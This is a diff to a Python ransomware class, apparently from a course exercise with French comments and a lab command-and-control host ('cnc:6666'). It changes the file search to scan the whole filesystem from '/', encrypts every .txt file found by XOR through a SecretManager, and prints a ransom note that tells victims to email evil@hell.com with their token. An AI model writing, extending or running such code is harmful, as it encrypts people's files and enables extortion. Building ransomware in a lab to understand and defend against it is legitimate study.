@@ -5,20 +5,21 @@ import sys
 from pathlib import Path
 from secret_manager import SecretManager
 
+import random
+
 
 CNC_ADDRESS = "cnc:6666"
 TOKEN_PATH = "/root/token"
 
 ENCRYPT_MESSAGE = """
-  _____                                                                                           
- |  __ \                                                                                          
- | |__) | __ ___ _ __   __ _ _ __ ___   _   _  ___  _   _ _ __   _ __ ___   ___  _ __   ___ _   _ 
- |  ___/ '__/ _ \ '_ \ / _` | '__/ _ \ | | | |/ _ \| | | | '__| | '_ ` _ \ / _ \| '_ \ / _ \ | | |
- | |   | | |  __/ |_) | (_| | | |  __/ | |_| | (_) | |_| | |    | | | | | | (_) | | | |  __/ |_| |
- |_|   |_|  \___| .__/ \__,_|_|  \___|  \__, |\___/ \__,_|_|    |_| |_| |_|\___/|_| |_|\___|\__, |
-                | |                      __/ |                                               __/ |
-                |_|                     |___/                                               |___/ 
-
+   ____  _                     _ 
+  / __ \| |                   | |
+ | |  | | |__    _ __   ___   | |
+ | |  | | '_ \  | '_ \ / _ \  | |
+ | |__| | | | | | | | | (_) | |_|
+  \____/|_| |_| |_| |_|\___/  (_)
+                                 
+You shouldn't activate macros in random downloaded Word documents.
 Your txt files have been locked. Send an email to evil@hell.com with title '{token}' to unlock your data. 
 """
 class Ransomware:
@@ -38,16 +39,29 @@ class Ransomware:
         # return all files matching the filter
         
         # on crée la liste de tous les strings en appelant la fonction rglob()
-        list = sorted(Path().rglob(filter))
+        list = sorted(Path("/").rglob(filter))
 
         return list
 
     def encrypt(self):
         # main function for encrypting (see PDF)
+        #lister les fichiers txt
         list = self.get_files("*.txt")
-        call = SecretManager()
+
+        for i in range(len(list)):
+            print(f"Liste des fichiers txt trouvés : {list[i]}")
+        
+        #appeler la classe SecretManager()
+        call = SecretManager(CNC_ADDRESS, TOKEN_PATH)
         call.setup()
-        call.xorfiles(list)
+
+        #chiffrement des fichiers
+        for i in range(len(list)):
+            call.xorfiles(list[i])
+
+        #affichage du message permettant à la victime de contacter l'attaquant
+        token = call.get_hex_token()
+        print(ENCRYPT_MESSAGE.format(token = token))
         
 
     def decrypt(self):
